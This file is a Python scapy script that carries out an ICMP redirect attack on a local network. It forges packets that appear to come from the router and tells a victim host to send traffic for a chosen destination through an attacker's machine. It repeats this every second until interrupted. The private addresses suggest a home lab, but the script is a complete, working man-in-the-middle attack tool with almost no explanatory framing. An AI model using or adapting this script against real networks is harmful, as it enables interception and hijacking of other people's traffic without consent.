#!/usr/bin/python3

import time
from scapy.all import *

ip_to_host={
        'httpbin.org': '35.173.225.247',
        'gohxiangzheng.com': '13.33.30.1', # actual subnet range is 13.33.30.0/24 - to test if the redirect still works with a generic .1 subnet value,
        'httpforever.com': '146.190.62.39',
        'gateway': '192.168.1.254'
        }


victim_ip='192.168.1.68'
attacker_ip='192.168.1.101'
router_ip='192.168.1.254'
remote_dest_ip=ip_to_host['gateway'] 

eth=Ether(type=0x0800)
#eth.src=''
eth.dst='d8:f2:ca:d2:44:02'

ip = IP()
ip.src=router_ip
ip.dst=victim_ip

icmp = ICMP(type=5, code=1)
icmp.gw = attacker_ip

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip_icmp_payload = IP(src = victim_ip, dst = remote_dest_ip)
ip_icmp_payload.src=victim_ip
ip_icmp_payload.dst=remote_dest_ip

print(eth.display)
print(ip.display)
print(icmp.display)
print(ip_icmp_payload.display)

try:

    while(1):
        #send(ip/icmp/ip2/ICMP())

        print(f'redirect for {victim_ip}: {remote_dest_ip} via gateway addr {attacker_ip}')
        sendp(eth/ip/icmp/ip_icmp_payload/TCP(), verbose=False) # sendp() for layer2
        time.sleep(1)

except KeyboardInterrupt:
    print('Gracefully exiting the program...')
    exit()

